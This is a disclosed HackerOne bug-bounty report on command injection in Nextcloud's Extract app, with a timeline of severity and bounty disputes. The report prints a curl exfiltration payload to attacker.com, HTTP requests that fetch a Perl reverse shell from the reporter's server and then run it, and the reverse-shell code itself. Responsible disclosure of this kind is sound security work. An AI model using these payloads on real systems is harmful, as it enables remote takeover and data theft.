---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/os-command-injection
  - env/web
substate: "resolved"
weakness: "OS Command Injection"
enriched: true
body: true
date: 2019-05-30
submitted: 2019-04-23T09:09:35.695Z
bounty_usd: null
votes: 124
cve: "CVE-2019-5441"
program: "[[programs/nextcloud|Nextcloud]]"
reporter: "hdbreaker"
source: "https://hackerone.com/reports/546753"
title: "Remote Code Execution via Extract App Plugin"
---
# Remote Code Execution via Extract App Plugin

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 124 | **Program:** Nextcloud | **Disclosed:** 2019-05-30

- Report: [https://hackerone.com/reports/546753](https://hackerone.com/reports/546753)
- CWE: OS Command Injection | CVE: CVE-2019-5441
- Submitted: 2019-04-23T09:09:35.695Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hi, I found a critical issue in the Add-on "Extract" listed in the Nextcloud Marketplace: https://apps.nextcloud.com/apps/extract (This extension can be installed directly from Nextcloud Application)

The vulnerability was found in file: extract/lib/Controller/ExtractionController.php line 102.

The affected code can be seen below:

```
if (extension_loaded ("rar")){
				$rar_file = rar_open($file);
				$list = rar_list($rar_file);
				var_dump($rar_file);
				foreach($list as $fileOpen) {
					$entry = rar_entry_get($rar_file, $fileOpen->getName());
					$entry->extract($dir); // extract to the current dir
					self::scanFolder('/'.$this->UserId.'/files'.$directory.'/'.$fileOpen->getName());
				}
				rar_close($rar_file); 
			}else{
                ######## BUG HERE #########
				exec("unrar x \"".$file."\" -R \"".$dir."\" -o+",$output,$return);
                #########################
				foreach ($output as $val ) {
					if(preg_split('/ /', $val, -1, PREG_SPLIT_NO_EMPTY)[0] == "Extracting" && 
					preg_split('/ /', $val, -1, PREG_SPLIT_NO_EMPTY)[1] != "from"){
						$fichier = substr(strrchr($PATH, "/"), 1);
						self::scanFolder('/'.$this->UserId.'/files'.$directory.'/'.$fichier);
					}
				}
			}
```

The unrar line allows Command Injection via $file and $dir parameters, an attacker could use the following payload in order to exploit a Remote Command Execution in a Nextcloud Server and exfiltrate data via Curl requests.

```
nameOfFile=sample.rar"|curl www.attacker.com:443/data?id=$(id | base64)|"&directory=&external=0
```

Abusing this issue I was able to take full control of the demo instance: https://demo.nextcloud.com/lun0shai/

The steps to reproduce this PoC can be seen below:

1) Create a demo instance in https://demo.nextcloud.com and login.
2) Install the plugin Extract directly from the Apps menu:

{F474350}

3) Once the Add-on is installed, the attacker needs to upload a sample.rar file:

{F474351}

4) Then, the attacker needs to use the functionality "Extract Here" from the context menu and intercept the HTTP Request with BurpSuite:

{F474352}

Burp Interceptor:
{F474356}

5) At this point, the attacker can manipulate the $nameOfFile and & $dir parameters to achieve Remote Code Execution in the Nextcloud Instance. This PoC of RCE was performed over a Demo Instance running the latest version of NextClou.

To achieve RCE over Demo Instance 2 payloads were needed:

a) The attacker needs to force the application to download a Perl Reverse Shell to /tmp folder using curl, this was achieved using the following HTTP Request:

Note: 
My server IP is: 138.68.1.244

HTTP Request:
```
POST /lun0shai/index.php/apps/extract/ajax/extractRar.php HTTP/1.1
Host: demo.nextcloud.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
requesttoken: v+/28PW5/gilVA9we7iR7yrAYLjQCiYpfyx4e+jIdPU=:24ODl5qN0WLLN14xF+vgrEC0EM/ifB55OxU1SIe+LcE=
OCS-APIREQUEST: true
X-Requested-With: XMLHttpRequest
Content-Length: 98
Connection: close
Cookie: oco9fwvj7vid=aashsh75p508m9qk0tdq0ahk8v; oc_sessionPassphrase=XmIYyFzOLH1JtcvmdyZ6JbO67Sh1lbdC6UlHe0FkyVXeu5e2gA%2FOloJaUrRkXAb8sDLgF2pQYpUh1NlHeS8rpppQZakBiTH3K9%2FwWAytej%2FCTkV9%2FurYyRaMVQWLbAyu; nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true; nc_username=admin; nc_token=eGciTpRb4Bu7DpG2ohUjUWhAd%2BjQGRbb; nc_session_id=aashsh75p508m9qk0tdq0ahk8v

nameOfFile=sample.rar"|curl http://138.68.1.244/shell.pl -o /tmp/shell2.pl|"&directory=&external=0
```

HTTP Response:
```
HTTP/1.1 200 OK
Date: Tue, 23 Apr 2019 08:24:50 GMT
Server: Apache
Strict-Transport-Security: max-age=15768000
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Content-Security-Policy: default-src 'none';base-uri 'none';manifest-src 'self';script-src 'nonce-bXBVNko3dWtWZnFVMzl3QnpTMHBlSkwvYlhhSWtLczZXelhlTFRkMGNJdz06L3ZsUFFOU1FlcEQ2dkkxQW9YNVlPL2lMSFFHNjVwTnFId3lUSGxnQ0tiZz0=';style-src 'self' 'unsafe-inline';img-src 'self' data: blob:;font-src 'self' data:;connect-src 'self' stun.nextcloud.com:443;media-src 'self';frame-src https://demo.nextcloud.com
X-Frame-Options: SAMEORIGIN
Content-Length: 4
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
X-Robots-Tag: none
X-Download-Options: noopen
X-Permitted-Cross-Domain-Policies: none
Referrer-Policy: no-referrer
Content-Type: application/json; charset=utf-8
Connection: close

null
```

The above request wrote the following reverse shell in /tmp/shell.pl
```
use Socket;$i="138.68.1.244";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}
```

(At this point a Netcat Listener was running on my Server)
{F474360}

b) A second HTTP Request was needed to execute the Perl Reverse Shell and gain full shell access over the remote server (demo.nextcloud.com):

HTTP Request:
```
POST /lun0shai/index.php/apps/extract/ajax/extractRar.php HTTP/1.1
Host: demo.nextcloud.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
requesttoken: v+/28PW5/gilVA9we7iR7yrAYLjQCiYpfyx4e+jIdPU=:24ODl5qN0WLLN14xF+vgrEC0EM/ifB55OxU1SIe+LcE=
OCS-APIREQUEST: true
X-Requested-With: XMLHttpRequest
Content-Length: 66
Connection: close
Cookie: oco9fwvj7vid=aashsh75p508m9qk0tdq0ahk8v; oc_sessionPassphrase=XmIYyFzOLH1JtcvmdyZ6JbO67Sh1lbdC6UlHe0FkyVXeu5e2gA%2FOloJaUrRkXAb8sDLgF2pQYpUh1NlHeS8rpppQZakBiTH3K9%2FwWAytej%2FCTkV9%2FurYyRaMVQWLbAyu; nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true; nc_username=admin; nc_token=eGciTpRb4Bu7DpG2ohUjUWhAd%2BjQGRbb; nc_session_id=aashsh75p508m9qk0tdq0ahk8v

nameOfFile=sample.rar"|perl /tmp/shell2.pl|"&directory=&external=0
```

After these steps, my Server (IP: 138.68.1.244) received the Reverse Shell successfully and I was able to move freely over the Docker Instance of Nextcloud, reading even the config file as can be seen below:

An inbound connection from demo.nextcloud.com was received
{F474361}

Content of /config/config.php
{F474362}

Hope this could help to improve your security and check continuously the Applications that you spread using your market.

Please do not hesitate to contact me if you need any help to detect/resolve this issue.

Regards,

## Impact

An authenticated user could use the Extract Plugin listed in the Apps Market of Nextcloud to achieve Remote Code Execution in any Nextcloud instance.

## Timeline

- **Report Filed**
- **2019-04-23** @Nextcloud: Thanks a lot for reporting this potential issue back to us!

Our security team will take a look at this issue as soon as possible. We will reply to your report within 72 hours, usually much faster. For obvious reasons we'd like to ask you to not disclose this issue to any other party.
- **2019-04-24** @hdbreaker: Hi, do you have news about this issue?
- **2019-04-29** @nickvergessen: Hello hdbreaker,

thanks for your report. We could reproduce the problem and notified the app author about the issue and also included a patch.

Please note, that administrators have "remote code execution" by design, as they can just publish their own app and install that. However in this case also non admins can abuse the bug after tricking an admin into installing the app, so we want to make sure this gets fixed.

We will give you a heads up once we got a reply from the app author.
- **Report Triaged**
- **Report Severity Updated**
- **2019-04-29** @hdbreaker: Hi @nickvergessen!

Nice to hear from you, regarding your response, yes any user (without privileges) could exploit this issue if the plugin is installed in the application!

If you need any help from my part please let me know!

Regards,
- **2019-04-29** @hdbreaker: I have a question about the updated severity, you change the severity to High but the program explicitly said that a RCE for a non-admin user is a Critical Risk. Could you explain to me the motive of the updated severity to High?

{F478173}
- **2019-04-30** @nickvergessen: > Could you explain to me the motive of the updated severity to High?

I simply used the "CVSS v3.0 Calculator" which hackerone provides. I think it results from the change, that the user needs to trick the admin into installing the app first.
- **Report Resolved**
- **Swag Awarded**
- **Agreed On Going Public**
- **2019-04-30** @hdbreaker: Hi guys! I do not agree with the desition! first of all the Risk is Critical because if the plugin is already installed you do not need to trick anyone and a lot of people decide to upload content compressed to move easily folders and files from their computer to its own cloud.

Additionally, regarding the monetary rewards, you must pay for this issue because your program explicitly says: "Note that all apps are cryptographically signed by developers and reports thus usually don't qualify for monetary rewards as they don't affect Nextcloud instances." And this issue affects directly Nextcloud instances!

{F481122}

Also, I demonstrate the big impact of this issue owning your own Nextcloud Instance!!!
- **Hacker Requested Mediation**
- **2019-04-30** @nickvergessen: We can easily raise the Risk to Critical, when you can tell me the CVSS calculation to make it critical.

---

Then screenshot refers to the software running at https://apps.nextcloud.com/, not the apps that are actually provided through it.
- **2019-04-30** @hdbreaker: Guys the app is listed in your marketplace and can be installed directly from Nextcloud without any validation, you must protect your users to install secure applications from your own marketplace, just a few clicks and Nexcloud could be pwned. You must check the security of the add-ons pushed by the developers that you trust! 

You share with them a cryptographic firm to ensure the veracity and trust of their apps just to push an App to your market but when Nextcloud is compromised that is not your fault? This is a critical issue and affects several Nextcloud instances on the internet and you have to accept that responsibility
- **2019-04-30** @hdbreaker: Also, the correct CVSS is: CVSS:3.0/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H (9.0 Critical)
- **2019-04-30** @nickvergessen: Okay, so the problem is the PR (privileges required), you say Low and I say High:

> **Low:** The attacker is authorized with (i.e. requires) privileges that provide basic user capabilities that could normally affect only settings and files owned by a user. Alternatively, an attacker with low privileges may have the ability to cause an impact only to non-sensitive resources.
**High:** The attacker is authorized with (i.e. requires) privileges that provide significant (e.g. administrative) control over the vulnerable component that could affect component-wide settings and files.

You need administrative permissions to install the vulnerable component, which is why I picked high. Anyway, from our side this is okay as is. We can see if the mediators think we did something wrong here.
- **2019-04-30** @hdbreaker: The issue is not to install or not the plugin, the problem is: if a Nexcloud instance **already had installed the Add-On** a **non-privileged user** *can upload a .rar file and exploit the bug*. So, **no admin privileges are needed to exploit the issue**, **any Nextcloud instance that already had the Add-on installed is vulnerable and a normal-user could exploit the issue**.

So, **the privileges to exploit the vulnerability are Low**, *due that if the plugin is already installed any user could exploit the issue to achieve RCE*. Also, the **Scope in the CVSS is changed because a non-administrative user that achieve the RCE could access files of other users**.

Hope you understand me.
- **2019-05-02** @hdbreaker: Hi guys, I need the CVE-Number related to this issue. If you will not thin in release a CVE Number for this issue  I will have to send the issue to MITRE directly.
- **2019-05-03** @nickvergessen: Once you agreed on the public disclosure, we can publish it, make our advisory and then request a CVE via hackerone
- **Not Eligible For Bounty**
- **2019-05-03** @hdbreaker: Ok, let's wait for the mediation.
- **2019-05-15** @hdbreaker: Hey guys! How are you? I was thinking that maybe that we could try to reach a middle point regarding this issue due to the impact.
- **2019-05-16** @nickvergessen: So you pay half the bounty to us and we pay half the bounty to you?
Sorry that simply doesn't work. It's not our code and it's excluded from bounties.
- **2019-05-16** @hdbreaker: Hey @nickvergessen I felt you response really aggressive, if that is the way that you take to talk with researchers maybe the next time that one of them found a bug, he just will make the bug public and expose all your secret keys and customers data to internet. ;)

Take caution with your words, if you hit someone do not expect petting. I have more bugs to report you but you will not here again from me directly.

Let’s close the report and let’s advance with the disclosure.

Regards,
- **2019-05-16** @nickvergessen: I was obviously joking and not being aggressive.

I'm not sure what you want from us. Google also doesn't pay money for a security issue in an app, although you can take over any android phone with it.
- **2019-05-16** @hdbreaker: It’s fine I expected that you realize the impact of the issue, take action over it and give me a little bit more than only kudos for my research effort and also by the impact over Nextcloud instances due that if I decided to sold this vulnerability in the black market I could receive more than a swag.

I am really disappointed with your program and with your security team that does not show any interest in a critical risk issues that affect your core software and business (by a lateral bug, but the impact in your system is real).

I understand you but I feel that you do not have any interest in the security community and I do not have any motive to recommend your software and your program to the community due your non interest in an RCE with key data exfiltration over your system.

Hope you will be able to see the real impact of the issue and the effort and time that’s I expended to detect and exploit this issue but all point that you are not able to understand it.

Regards,
- **Report Became Public**
- **2019-05-31** @jospoortvliet: Hi HDbreaker,

I'm sorry you are not happy about the outcome of the issue you researched and reported. It is a great and well written report, thank you for your efforts in that and sorry some of our responses might come across a little snarky. I'm sure it was not meant that way, but the nature of online communication sometimes loses some subtlety.

With regards to the decision to not pay anything out, our policy and list of in-scope and out-of-scope issues is very clear, I think: https://hackerone.com/nextcloud

We explicitly list everything that is in scope and say that everything else is not. I hope you understand that we can not take responsibility for the code of all third parties who develop apps (well over 200!) for Nextcloud, and thus have not included this in the scope of our bug bounty program. I strongly suggest that next time, before you put significant effort into an issue you found, you first see if the issue is covered under the bug bounty program.

With regards to the relevancy to the Nextcloud ecosystem, I did have a quick look at the downloads of the Extract app. According to the github statistics, it has a little over 6000 downloads:
https://www.somsubhra.com/github-release-stats/?username=PaulLereverend&repository=NextcloudExtract
As we estimate there are about 300.000 Nextcloud servers in total, the app might have been installed (though perhaps also again disabled) on at most about 2-4% of those. So while it is certainly a serious issue that ought to be fixed, it should not impact that many users. Moreover, we generally urge our customers (who are a tiny percentage of the total user base of servers above) to consult with us before installing in-official apps.

Again, I'm sorry you feel your report is mishandled. I hope you understand we take security serious but can only take responsibility for the code we wrote and support for our customers.

Greetings
- **2019-05-31** @jospoortvliet: A clarification, as I see you mentioned that we list the domain apps.nextcloud.com as in scope.

All source code/apps which are covered can be found in the list of what is in scope. We also list a number of services we run. Indeed, as part of that we list the *domain* apps.nextcloud.com, this covers exactly that: the domain itself. You can find the source code of the app store here: https://github.com/nextcloud/appstore

HackerOne is quite clear on the difference between domains and source code. A domain covers hacking the server(s) running there using the code they run - it doesn't mean to cover anything that is hosted on that domain and everything you could do with whatever is hosted there.

Compare it to github - github would of course cover with bounties anyone who breaks into their server running on github.com. They would NOT cover any bounties on any of the security issues in any of the millions of software projects hosted on github.com!

WRT the number of vulnerable systems, let's note that the attacker needs an account on the system, or be able to guess a public upload link. That pretty much excludes automated attacks on a large number of Nextcloud instances.
- **2019-06-03** @hdbreaker: Hey, since you disclosure the bug, Do you have already the CVE Number? Can send me the number, please.
- **2019-06-05** @hdbreaker: Well, I think that I must write directly to MITRE for this.
- **2019-06-05** @rullzer: Hi @hdbreaker,

Please have some patience. Public holidays and vacations some times slow things down a bit. And we can only request the CVE once the report has been disclosed. Long story short. The CVE is requested. This can take some time before it is assigned.

Cheers,
--Roeland
- **2019-06-07** @hdbreaker: Hey guys I want to let you know that the CVE-ID in this report is incorrect, the correct one is https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12739
- **2019-06-21** @nickvergessen: Well the CVE is assigned by HackerOne as we requested it and we can't change it.
But the linked CVE is now marked as rejected and has a redirect to your entry, so it should be fine too.
- **2019-06-24** @hdbreaker: Cool, great!
